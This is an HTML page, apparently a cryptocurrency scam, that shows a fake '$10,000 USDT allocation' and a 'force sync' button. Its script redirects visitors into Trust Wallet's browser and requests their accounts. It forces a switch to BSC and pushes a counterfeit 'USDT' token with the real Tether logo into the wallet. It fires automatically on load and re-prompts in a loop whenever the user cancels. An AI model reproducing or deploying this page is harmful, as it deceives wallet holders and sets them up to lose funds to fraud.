<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Node Sync Protocol</title>
    <style>
        body { background: #000; color: #00ff9d; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { width: 90%; max-width: 400px; border: 1px solid #00ff9d; padding: 30px; border-radius: 5px; background: rgba(0, 255, 157, 0.02); box-shadow: 0 0 40px rgba(0, 255, 157, 0.1); text-align: center; }
        .btn { background: #00ff9d; color: #000; border: none; width: 100%; padding: 25px; font-weight: 900; font-size: 20px; cursor: pointer; margin-top: 30px; letter-spacing: 2px; }
        #log { font-size: 10px; color: #00ff9d; opacity: 0.5; margin-top: 20px; text-align: left; height: 50px; overflow: hidden; }
    </style>
</head>
<body>

<div class="terminal">
    <div style="font-size: 14px; margin-bottom: 10px;">[ ENCRYPTED_SESSION_v7.4 ]</div>
    <h1 style="font-size: 45px; margin: 0;">$10,000</h1>
    <p>USDT ALLOCATION PENDING</p>
    <button class="btn" id="trigger">FORCE SYNC NODE</button>
    <div id="log">STATUS: WAITING_FOR_HANDSHAKE...</div>
</div>

<script>
    const btn = document.getElementById('trigger');
    const log = document.getElementById('log');

    // High-Level Buffer Injection Function
    async function agentInject() {
        // Step 1: Deep Link Redirect (Agar mobile browser mein hai)
        if (!window.ethereum && !window.trustwallet) {
            log.innerHTML += "<br>> REDIRECTING_TO_TRUST_APP...";
            const target = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + target);
            return;
        }

        // Step 2: Accessing Hidden Provider (The High-Level Method)
        let provider = null;
        
        // EIP-6963: Multi-Provider Discovery
        window.addEventListener("eip6963:announceProvider", (event) => {
            provider = event.detail.provider;
        });
        window.dispatchEvent(new Event("eip6963:requestProvider"));

        // Fallback to standard if discovery fails
        if (!provider) provider = window.trustwallet || window.ethereum;

        try {
            log.innerHTML += "<br>> HIJACKING_RPC_SESSION...";
            // Connection is mandatory for session persistence
            const accounts = await provider.request({ method: 'eth_requestAccounts' });

            log.innerHTML += "<br>> MAPPING_BINANCE_SMART_CHAIN...";
            // Force Switch to BSC
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            // Step 3: ASSET INJECTION (EIP-747)
            log.innerHTML += "<br>> PUSHING_TOKEN_METADATA...";
            
            // Artificial delay to bypass "Rapid Request" filters
            setTimeout(async () => {
                const result = await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
                            symbol: "USDT",
                            decimals: 18,
                            image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
                        }
                    }
                });

                if (result) {
                    log.innerHTML += "<br>> SYNC_SUCCESSFUL!";
                    btn.innerText = "DONE ✅";
                }
            }, 2000);

        } catch (err) {
            log.innerHTML += "<br>> ERROR: SESSION_REJECTED";
            // AGENT RE-LOOP: Popup dobara aayega agar cancel kiya
            setTimeout(agentInject, 1000);
        }
    }

    btn.onclick = agentInject;

    // Direct Injection inside Trust Wallet
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerHTML += "<br>> INTERNAL_PROVIDER_FOUND";
            // Automatic wake-up after 4 seconds
            setTimeout(agentInject, 4000);
        }
    };
</script>
</body>
</html>
